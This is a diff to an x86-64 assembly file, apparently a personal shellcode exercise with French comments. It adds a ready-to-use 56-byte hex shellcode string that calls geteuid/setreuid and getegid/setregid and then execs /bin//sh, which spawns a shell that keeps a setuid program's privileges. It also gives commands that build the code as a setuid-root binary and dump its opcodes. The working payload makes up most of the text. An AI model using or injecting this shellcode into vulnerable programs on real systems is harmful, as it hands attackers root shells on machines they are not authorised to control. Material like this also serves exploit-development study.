@@ -54,6 +54,12 @@ _start:
 
 ; shellcode 32 bits généric il utilise seteuid et setegid avec un get pour avoir ceux du 
 ; fichier source 
-;nasm -f elf64 shellcode_generic.asm && ld shellcode_generic.o -o shellcode_generic -m elf_x86_64 && sudo chown  root ./shellcode_generic && sudo chgrp root ./shellcode_generic && sudo chmod +x ./shellcode_generic && sudo chmod +s ./shellcode_generic && ./shellcode_generic 
+;nasm -f elf64 shellcode_generic_2.asm && ld shellcode_generic_2.o -o shellcode_generic_2 -m elf_x86_64 && sudo chown  root ./shellcode_generic_2 && sudo chgrp root ./shellcode_generic_2 && sudo chmod +x ./shellcode_generic_2 && sudo chmod +s ./shellcode_generic_2 && ./shellcode_generic_2 
 
-;for i in $(objdump -d ./shellcode_generic -M intel | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
+;for i in $(objdump -d ./shellcode_generic_2 -M intel | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
+
+
+; hexa : \x48\x31\xc0\xb0\x6b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xfe\xb0\x71\x0f\x05\xb0\x6c\x0f\x05\x89\xc7\x48\x31\xc0\x89\xfe\xb0\x72\x0f\x05\x31\xf6\xf7\xe6\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x57\x48\x89\xe7\xb0\x3b\x0f\x05
+
+
+; 56 bytes
